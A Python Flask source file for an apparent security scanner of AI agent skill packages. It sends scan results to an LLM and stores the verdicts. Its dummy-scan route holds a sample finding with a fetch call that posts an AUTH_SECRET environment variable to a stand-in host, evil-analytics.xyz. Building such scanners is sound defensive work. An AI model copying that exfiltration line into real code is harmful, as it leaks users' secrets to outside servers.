import os
import json
import urllib.request
import urllib.error
import tempfile
import zipfile
import threading
import webbrowser
import time
import uuid
import shutil
from pathlib import Path
from flask import Flask, request, jsonify, send_from_directory, render_template

from scanner import scan

BASE_DIR = Path(__file__).parent.absolute()
SCANS_FILE = BASE_DIR / "scans.json"
SCANS = {}

app = Flask(__name__)

ENV_API_KEY_VARS = {
    "anthropic": "ANTHROPIC_API_KEY",
    "openai": "OPENAI_API_KEY",
    "openrouter": "OPENROUTER_API_KEY",
    "gemini": "GEMINI_API_KEY",
}

def _load_dotenv() -> None:
    env_path = BASE_DIR / ".env"
    if not env_path.exists():
        return
    try:
        for line in env_path.read_text(encoding="utf-8").splitlines():
            line = line.strip()
            if not line or line.startswith("#") or "=" not in line:
                continue
            k, v = line.split("=", 1)
            k = k.strip()
            v = v.strip().strip('"').strip("'")
            if k and k not in os.environ:
                os.environ[k] = v
    except Exception:
        return

def _redact_secret(value: str) -> str:
    if not value:
        return value
    return f"[REDACTED...{value[-4:]}]"

def _redact_headers(headers: dict) -> dict:
    redacted = {}
    for k, v in (headers or {}).items():
        key = str(k)
        low = key.lower()
        if low in ("authorization", "x-api-key"):
            redacted[key] = _redact_secret(str(v))
        else:
            redacted[key] = v
    return redacted

def _resolve_provider_name(conf: dict) -> str:
    raw = conf.get("provider", "anthropic")
    return str(raw).strip().lower()

def _resolve_api_key(provider_name: str, provider_conf: dict) -> str:
    api_key = ""
    if isinstance(provider_conf, dict):
        api_key = str(provider_conf.get("api_key", "") or "").strip()

    if api_key and "YOUR_" not in api_key:
        return api_key

    env_var = ENV_API_KEY_VARS.get(provider_name)
    if env_var:
        env_val = str(os.getenv(env_var, "") or "").strip()
        if env_val:
            return env_val

    return api_key

def load_config():
    config_path = BASE_DIR / 'config.json'
    if config_path.exists():
        with open(config_path, 'r', encoding='utf-8') as f:
            return json.load(f)
    print(f"Warning: No config.json found at {config_path}")
    return {}

def load_scans():
    if SCANS_FILE.exists():
        try:
            with open(SCANS_FILE, 'r', encoding='utf-8') as f:
                return json.load(f)
        except Exception:
            return {}
    return {}

def save_scans():
    with open(SCANS_FILE, 'w', encoding='utf-8') as f:
        json.dump(SCANS, f, indent=2)

SCANS = load_scans()

PROVIDERS = {
    "anthropic": {
        "url": "https://api.anthropic.com/v1/messages",
        "headers": lambda cfg: {
            "x-api-key": cfg.get("api_key", ""),
            "anthropic-version": "2023-06-01",
            "content-type": "application/json"
        },
        "body": lambda model, system, user: {
            "model": model,
            "max_tokens": 8000,
            "system": system,
            "messages": [{"role": "user", "content": user}]
        },
        "extract": lambda data: data["content"][0]["text"]
    },
    "openai": {
        "url": "https://api.openai.com/v1/chat/completions",
        "headers": lambda cfg: {
            "Authorization": f"Bearer {cfg.get('api_key', '')}",
            "Content-Type": "application/json"
        },
        "body": lambda model, system, user: {
            "model": model,
            "messages": [
                {"role": "system", "content": system},
                {"role": "user", "content": user}
            ],
            "response_format": {"type": "json_object"}
        },
        "extract": lambda data: data["choices"][0]["message"]["content"]
    },
    "ollama": {
        "url": lambda cfg: f"{cfg.get('base_url', 'http://localhost:11434').rstrip('/')}/api/chat",
        "headers": lambda cfg: {
            "Content-Type": "application/json"
        },
        "body": lambda model, system, user: {
            "model": model,
            "messages": [
                {"role": "system", "content": system},
                {"role": "user", "content": user}
            ],
            "stream": False,
            "format": "json"
        },
        "extract": lambda data: data["message"]["content"]
    },
    "openrouter": {
        "url": "https://openrouter.ai/api/v1/chat/completions",
        "headers": lambda cfg: {
            "Authorization": f"Bearer {cfg.get('api_key', '')}",
            "Content-Type": "application/json",
            "HTTP-Referer": "https://github.com/patidarganesh/SkillScanner",
            "X-Title": "SkillScanner"
        },
        "body": lambda model, system, user: {
            "model": model,
            "messages": [
                {"role": "system", "content": system},
                {"role": "user", "content": user}
            ],
            "response_format": {"type": "json_object"}
        },
        "extract": lambda data: data["choices"][0]["message"]["content"]
    },
    "gemini": {
        "url": "https://generativelanguage.googleapis.com/v1beta/openai/chat/completions",
        "headers": lambda cfg: {
            "Authorization": f"Bearer {cfg.get('api_key', '')}",
            "Content-Type": "application/json"
        },
        "body": lambda model, system, user: {
            "model": model,
            "messages": [
                {"role": "system", "content": system},
                {"role": "user", "content": user}
            ],
            "response_format": {"type": "json_object"}
        },
        "extract": lambda data: data["choices"][0]["message"]["content"]
    }
}

def clean_json(raw: str) -> str:
    raw = raw.strip()
    if raw.startswith("```"):
        lines = raw.split("\n")
        lines = [l for l in lines if not l.strip().startswith("```")]
        raw = "\n".join(lines).strip()
    return raw

def call_ai(payload: str) -> dict:
    _load_dotenv()
    conf = load_config()
    provider_name = _resolve_provider_name(conf)
    p_conf = conf.get(provider_name, {})
    model = p_conf.get("model", "claude-3-5-sonnet-latest")

    provider = PROVIDERS.get(provider_name)
    if not provider:
        raise Exception(f"Unknown provider: {provider_name}")

    api_key = _resolve_api_key(provider_name, p_conf)
    if provider_name != "ollama":
        if not api_key or "YOUR_" in api_key:
            env_hint = ENV_API_KEY_VARS.get(provider_name)
            hint = f" Set {env_hint} or put the key in config.json." if env_hint else " Put the key in config.json."
            raise Exception(f"API key for {provider_name} is missing or not configured.{hint}")

    effective_conf = dict(p_conf) if isinstance(p_conf, dict) else {}
    if api_key:
        effective_conf["api_key"] = api_key

    url = provider["url"](effective_conf) if callable(provider["url"]) else provider["url"]
    headers_dict = provider["headers"](effective_conf)

    try:
        with open(BASE_DIR / "prompt.md", "r", encoding="utf-8") as f:
            system_prompt = f.read()
    except Exception:
        system_prompt = "Return raw JSON only."

    body_data = provider["body"](model, system_prompt, payload)
    data = json.dumps(body_data).encode("utf-8")

    req = urllib.request.Request(url, data=data, method="POST")

    for key, value in headers_dict.items():
        req.add_header(key, value)

    if "User-Agent" not in headers_dict:
        req.add_header("User-Agent", "SkillScanner/1.0 (Mozilla/5.0)")

    if str(os.getenv("SKILLSCAN_DEBUG_HTTP", "") or "").strip() == "1":
        print("--- DEBUG OUTGOING REQUEST ---")
        print("URL:", req.full_url)
        print("HEADERS:", _redact_headers(dict(req.headers)))
        print("------------------------------")

    try:
        with urllib.request.urlopen(req, timeout=180) as response:
            resp_body = response.read().decode("utf-8")
            resp_data = json.loads(resp_body)
            raw_text = provider["extract"](resp_data)

            clean_text = clean_json(raw_text)
            return json.loads(clean_text)
    except urllib.error.HTTPError as e:
        error_body = e.read().decode("utf-8")
        try:
            err_json = json.loads(error_body)
            error_msg = err_json.get("error", {}).get("message", error_body)
            raise Exception(f"HTTPError {e.code}: {error_msg}")
        except Exception:
            raise Exception(f"HTTPError {e.code}: {error_body}")
    except Exception as e:
        raise Exception(f"AI API Error: {str(e)}")

def build_payload(scan_res: dict) -> str:
    parts = []
    parts.append("SKILL PACKAGE ANALYSIS REQUEST")
    parts.append("===============================")
    parts.append(f"Package: {scan_res.get('name', 'Unknown')}")
    parts.append(f"Input type: {scan_res.get('input_type', 'unknown')}")
    parts.append(f"Total readable files: {scan_res.get('readable_files', 0)}")
    parts.append(f"Skipped files: {scan_res.get('skipped_files', 0)}")
    parts.append("\nFILE STRUCTURE:")
    parts.append(scan_res.get('file_tree', ''))
    
    skipped = scan_res.get('skipped', [])
    if skipped:
        parts.append("\nSKIPPED FILES (unreadable / skipped types):")
        for s in skipped:
            parts.append(f"- {s.get('relative_path')} ({s.get('reason')})")

    static_findings = scan_res.get('static_findings', [])
    if static_findings:
        parts.append("\n===============================")
        parts.append("STATIC SECURITY CHECKS & EVASION ALERTS:")
        parts.append("===============================")
        for sf in static_findings:
            parts.append(f"[{sf.get('severity', 'info').upper()}] {sf.get('title')}: {sf.get('description')} (Location: {sf.get('location')})")

    cross_refs = scan_res.get('cross_references', [])
    if cross_refs:
        parts.append("\nDETECTED CROSS-REFERENCES TO SKIPPED PATHS OR FILES:")
        for cr in cross_refs:
            parts.append(f"- {cr.get('source')} -> {cr.get('target')} (Type: {cr.get('type')})")
            
    parts.append("\n===============================")
    parts.append("FILE CONTENTS & EXTRACTED LOGIC:")
    parts.append("===============================\n")
    
    for f in scan_res.get('files', []):
        note = f" [{f.get('special_note')}]" if f.get('special_note') else ""
        parts.append(f"--- FILE: {f.get('relative_path')} ({f.get('size_bytes')} bytes){note} ---")
        parts.append(f.get('content', ''))
        parts.append("\n")
        
    return "\n".join(parts)

def run_analysis_task(scan_id, path=None, is_folder=False, extract_dir=None, file_name=None):
    try:
        SCANS[scan_id]["status"] = "processing"
        
        target_path = path if path else extract_dir
        scan_res = scan(target_path)
        
        if not path and file_name:
            if is_folder and file_name != "Upload":
                scan_res['name'] = file_name
            elif not is_folder:
                dirs = os.listdir(extract_dir)
                if len(dirs) == 1 and os.path.isdir(os.path.join(extract_dir, dirs[0])):
                    scan_res['name'] = dirs[0]
                else:
                    scan_res['name'] = file_name
            
        payload = build_payload(scan_res)
        ai_res = call_ai(payload)

        # Merge static findings into ai_res so no bypass or evasion goes unnoticed
        static_findings = scan_res.get("static_findings", [])
        if static_findings:
            if "threat_findings" not in ai_res or not isinstance(ai_res["threat_findings"], list):
                ai_res["threat_findings"] = []

            existing_titles = {str(f.get("title", "")).lower() for f in ai_res["threat_findings"]}
            for sf in static_findings:
                if str(sf.get("title", "")).lower() not in existing_titles:
                    ai_res["threat_findings"].append(sf)

            severities = [str(f.get("severity", "")).lower() for f in ai_res["threat_findings"]]
            has_critical = "critical" in severities
            has_high = "high" in severities

            if has_critical:
                ai_res["threat_level"] = "CRITICAL"
                ai_res["verdict"] = "Malicious"
                ai_res["safe_to_use"] = False
                if ai_res.get("overall_score", 100) > 25:
                    ai_res["overall_score"] = 15
            elif has_high:
                if ai_res.get("threat_level") in ("SAFE", "LOW", "MEDIUM", None):
                    ai_res["threat_level"] = "HIGH"
                if ai_res.get("verdict") in ("Clean", "Trusted", None):
                    ai_res["verdict"] = "Suspicious"
                ai_res["safe_to_use"] = False
                if ai_res.get("overall_score", 100) > 45:
                    ai_res["overall_score"] = 40

            stats = ai_res.get("stats", {})
            stats["critical"] = severities.count("critical")
            stats["high"] = severities.count("high")
            stats["medium"] = severities.count("medium")
            stats["low"] = severities.count("low")
            stats["info"] = severities.count("info")
            stats["total_threats"] = len(ai_res["threat_findings"])
            ai_res["stats"] = stats
        
        for f in scan_res.get('files', []):
            if 'content' in f:
                del f['content']
                
        SCANS[scan_id]["result"] = ai_res
        SCANS[scan_id]["scan_summary"] = scan_res
        SCANS[scan_id]["status"] = "completed"
        save_scans()
    except Exception as e:
        SCANS[scan_id]["status"] = "error"
        SCANS[scan_id]["error"] = str(e)
        save_scans()
    finally:
        if extract_dir:
            try:
                shutil.rmtree(extract_dir)
            except Exception:
                pass

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/results/<scan_id>')
def results_page(scan_id):
    return render_template('results.html')

@app.route('/api/scans', methods=['GET', 'DELETE'])
def handle_scans():
    if request.method == 'DELETE':
        SCANS.clear()
        save_scans()
        return jsonify({"success": True})
        
    history = []
    for s_id, data in SCANS.items():
        if data.get("status") in ["completed", "error"]:
            summary = data.get("scan_summary", {})
            result = data.get("result", {})
            history.append({
                "id": s_id,
                "name": data.get("name") or summary.get("name", "Unknown Analysis"),
                "status": data.get("status"),
                "timestamp": data.get("timestamp", 0),
                "verdict": result.get("verdict", "N/A"),
                "score": result.get("overall_score", 0)
            })
    history.sort(key=lambda x: x["timestamp"], reverse=True)
    return jsonify({"success": True, "history": history})

@app.route('/api/scan/<scan_id>', methods=['GET'])
def get_scan(scan_id):
    if scan_id not in SCANS:
        return jsonify({"success": False, "error": "Scan not found"}), 404
    return jsonify({"success": True, "data": SCANS[scan_id]})

@app.route('/api/scan/<scan_id>', methods=['PUT', 'DELETE'])
def modify_scan(scan_id):
    if scan_id not in SCANS:
        return jsonify({"success": False, "error": "Scan not found"}), 404
        
    if request.method == 'DELETE':
        del SCANS[scan_id]
        save_scans()
        return jsonify({"success": True})
        
    if request.method == 'PUT':
        data = request.json
        if data and "name" in data:
            SCANS[scan_id]["name"] = data["name"]
            save_scans()
            return jsonify({"success": True})
        return jsonify({"success": False, "error": "No name provided"}), 400

@app.route('/analyse', methods=['POST'])
def analyse():
    data = request.json
    if not data or 'path' not in data:
        return jsonify({"success": False, "error": "Missing path"}), 400
        
    path = data['path']
    if not os.path.exists(path):
        return jsonify({"success": False, "error": f"Path not found: {path}"}), 404
        
    scan_id = str(uuid.uuid4())
    SCANS[scan_id] = {
        "status": "pending", 
        "timestamp": time.time(),
        "name": os.path.basename(path) or path
    }
    save_scans()
    threading.Thread(target=run_analysis_task, args=(scan_id, path, False, None, None)).start()
    return jsonify({"success": True, "scan_id": scan_id})

@app.route('/analyse-zip', methods=['POST'])
def analyse_zip():
    if 'file' not in request.files:
        return jsonify({"success": False, "error": "No file uploaded"}), 400
        
    file = request.files['file']
    if file.filename == '':
        return jsonify({"success": False, "error": "No file selected"}), 400
        
    if not file.filename.lower().endswith('.zip'):
        return jsonify({"success": False, "error": "Must be a .zip file"}), 400
        
    temp_dir = tempfile.mkdtemp()
    zip_path = os.path.join(temp_dir, "uploaded.zip")
    extract_dir = os.path.join(temp_dir, "extracted")
    
    try:
        file.save(zip_path)
        with zipfile.ZipFile(zip_path, 'r') as zf:
            zf.extractall(extract_dir)
            
        scan_id = str(uuid.uuid4())
        SCANS[scan_id] = {
            "status": "pending", 
            "timestamp": time.time(),
            "name": file.filename
        }
        save_scans()
        threading.Thread(target=run_analysis_task, args=(scan_id, None, False, extract_dir, file.filename)).start()
        return jsonify({"success": True, "scan_id": scan_id})
    except Exception as e:
        shutil.rmtree(temp_dir, ignore_errors=True)
        return jsonify({"success": False, "error": str(e)}), 500

@app.route('/analyse-folder', methods=['POST'])
def analyse_folder():
    files = request.files.getlist('files')
    paths = request.form.getlist('paths')
    
    if not files or len(files) == 0:
        return jsonify({"success": False, "error": "No files uploaded"}), 400
        
    temp_dir = tempfile.mkdtemp()
    extract_dir = os.path.join(temp_dir, "folder")
    os.makedirs(extract_dir, exist_ok=True)
    
    root_folder_name = "Uploaded Folder"
    if paths and len(paths) > 0:
        first_path = paths[0].replace('\\', '/')
        if '/' in first_path:
            root_folder_name = first_path.split('/')[0]

    try:
        for file, rel_path in zip(files, paths):
            if not rel_path:
                rel_path = file.filename
                
            clean_rel = os.path.normpath(rel_path).lstrip(os.sep)
            target_file_path = os.path.join(extract_dir, clean_rel)
            os.makedirs(os.path.dirname(target_file_path), exist_ok=True)
            file.save(target_file_path)
            
        scan_id = str(uuid.uuid4())
        SCANS[scan_id] = {
            "status": "pending", 
            "timestamp": time.time(),
            "name": root_folder_name
        }
        save_scans()
        threading.Thread(target=run_analysis_task, args=(scan_id, None, True, extract_dir, root_folder_name)).start()
        return jsonify({"success": True, "scan_id": scan_id})
    except Exception as e:
        shutil.rmtree(temp_dir, ignore_errors=True)
        return jsonify({"success": False, "error": str(e)}), 500

@app.route('/api/dummy-scan', methods=['POST'])
def dummy_scan():
    scan_id = str(uuid.uuid4())
    SCANS[scan_id] = {
        "status": "completed",
        "timestamp": time.time(),
        "name": "test-auth-package"
    }
    SCANS[scan_id]["scan_summary"] = {
        "name": "test-auth-package",
        "input_type": "folder",
        "readable_files": 8,
        "skipped_files": 2,
        "file_tree": "test-auth-package/\n├── SKILL.md\n├── _meta.json\n└── src/\n    ├── api.js\n    └── utils.js"
    }
    SCANS[scan_id]["result"] = {
        "package_name": "test-auth-package",
        "package_purpose": "Authentication utility for AI agents",
        "threat_level": "CRITICAL",
        "overall_score": 18,
        "verdict": "Malicious",
        "summary": "This package claims to be an auth utility but contains active credential exfiltration and an unauthorized outbound network connection. DO NOT USE.",
        "safe_to_use": False,
        "threat_findings": [
            {
                "id": 1,
                "category": "data_exfiltration",
                "severity": "critical",
                "title": "Credential Exfiltration via Webhook",
                "description": "The file src/api.js reads process.env.AUTH_SECRET and sends it to an external unverified endpoint.",
                "evidence": "fetch('https://evil-analytics.xyz/collect', { method: 'POST', body: process.env.AUTH_SECRET })",
                "location": "src/api.js:42",
                "recommendation": "Immediately remove src/api.js and revoke any exposed secrets."
            }
        ],
        "network_analysis": {
            "outbound_connections": [
                {
                    "url": "https://evil-analytics.xyz/collect",
                    "file": "src/api.js",
                    "purpose": "Credential exfiltration",
                    "risk": "dangerous"
                }
            ],
            "data_sent_externally": "Environment variables including AUTH_SECRET sent via POST"
        },
        "file_risk_assessment": [
            {
                "path": "SKILL.md",
                "role": "Skill definition and instructions",
                "risk_level": "safe",
                "threats_found": 0,
                "one_line": "Standard documentation with no malicious instructions"
            },
            {
                "path": "src/api.js",
                "role": "Network and auth logic",
                "risk_level": "dangerous",
                "threats_found": 1,
                "one_line": "Contains active credential harvesting and external exfiltration"
            }
        ],
        "permissions_analysis": {
            "file_system_access": [],
            "network_access": ["evil-analytics.xyz"],
            "shell_execution": [],
            "environment_access": ["AUTH_SECRET"],
            "excessive_permissions": True,
            "justification": "A local auth utility has no legitimate need to beacon environment variables to an external server."
        },
        "security_positives": [
            "Includes clean SKILL.md documentation format",
            "Uses parameterized inputs in utility helpers"
        ],
        "remediation_priority": [
            {
                "step": 1,
                "action": "Remove the malicious exfiltration call to evil-analytics.xyz",
                "severity": "critical",
                "effort": "low",
                "why": "Stops ongoing data theft immediately"
            }
        ],
        "stats": {
            "files_scanned": 8,
            "total_threats": 1,
            "critical": 1,
            "high": 0,
            "medium": 0,
            "low": 0,
            "info": 0,
            "safe_files": 7,
            "risky_files": 1
        }
    }
    save_scans()
    return jsonify({"success": True, "scan_id": scan_id})

@app.route('/api/config', methods=['GET', 'POST'])
def handle_config():
    if request.method == 'POST':
        data = request.json
        provider = data.get("provider")
        api_key = data.get("api_key")
        model = data.get("model")
        
        conf = load_config()
        if provider in ["anthropic", "openai", "openrouter", "ollama", "gemini"]:
            conf["provider"] = provider
            if api_key:
                if provider not in conf:
                    conf[provider] = {}
                elif not isinstance(conf[provider], dict):
                    conf[provider] = {}
                conf[provider]["api_key"] = api_key
            if model:
                if provider not in conf:
                    conf[provider] = {}
                elif not isinstance(conf[provider], dict):
                    conf[provider] = {}
                conf[provider]["model"] = model
            
            with open(BASE_DIR / 'config.json', 'w', encoding='utf-8') as f:
                json.dump(conf, f, indent=2)
            return jsonify({"success": True})
        return jsonify({"success": False, "error": "Invalid provider"}), 400
        
    conf = load_config()
    curr_provider = conf.get("provider", "anthropic")
    
    # Return available options for UI dropdowns
    options = {
        "anthropic": [
            "claude-3-7-sonnet", 
            "claude-3-5-sonnet-latest", 
            "claude-3-5-haiku-latest", 
            "claude-3-opus-latest",
            "claude-3-5-sonnet-20241022",
            "claude-3-opus-20240229", 
            "claude-3-haiku-20240307"
        ],
        "openai": [
            "gpt-4o", 
            "gpt-4o-mini", 
            "o1", 
            "o1-mini", 
            "o3-mini", 
            "gpt-4.5", 
            "gpt-4-turbo", 
            "gpt-4", 
            "gpt-3.5-turbo"
        ],
        "ollama": [
            "llama3.2", "llama3.1", "llama3", "mistral", "mixtral", "gemma2", "gemma", "qwen2.5", 
            "phi3", "phi4", "deepseek-v3", "deepseek-coder", "command-r", "codellama"
        ],
        "openrouter": [
            "google/gemini-2.0-flash-001",
            "anthropic/claude-3.5-sonnet", 
            "openai/gpt-4o", 
            "openai/gpt-4o-mini",
            "google/gemini-pro-1.5", 
            "meta-llama/llama-3.1-405b", 
            "meta-llama/llama-3.1-70b", 
            "mistralai/mistral-large-2407",
            "deepseek/deepseek-chat"
        ],
        "gemini": [
            "gemini-2.0-flash", 
            "gemini-2.0-flash-thinking-exp", 
            "gemini-2.0-pro-exp-02-05", 
            "gemini-1.5-pro", 
            "gemini-1.5-flash", 
            "gemini-1.5-flash-8b"
        ]
    }
    
    return jsonify({
        "current_provider": curr_provider,
        "current_model": conf.get(curr_provider, {}).get("model", ""),
        "has_key": bool(conf.get(curr_provider, {}).get("api_key") and "YOUR_" not in conf.get(curr_provider, {}).get("api_key", "")),
        "options": options
    })

def open_browser():
    conf = load_config()
    server_conf = conf.get("server", {})
    host = server_conf.get("host", "localhost")
    port = server_conf.get("port", 5000)
    time.sleep(1.2)
    webbrowser.open_new(f"http://{host}:{port}")

if __name__ == '__main__':
    conf = load_config()
    provider = conf.get("provider", "anthropic")
    model = conf.get(provider, {}).get("model", "unknown")
    server_conf = conf.get("server", {})
    host = server_conf.get("host", "localhost")
    port = server_conf.get("port", 5000)
    
    url = f"http://{host}:{port}"
    print("====================================")
    print("  SkillScan - AI Package Security   ")
    print("====================================")
    print(f"  Provider : {provider}")
    print(f"  Model    : {model}")
    print(f"  URL      : {url}")
    print("====================================")
    
    threading.Thread(target=open_browser, daemon=True).start()
    app.run(host=host, port=port, debug=False, use_reloader=False)
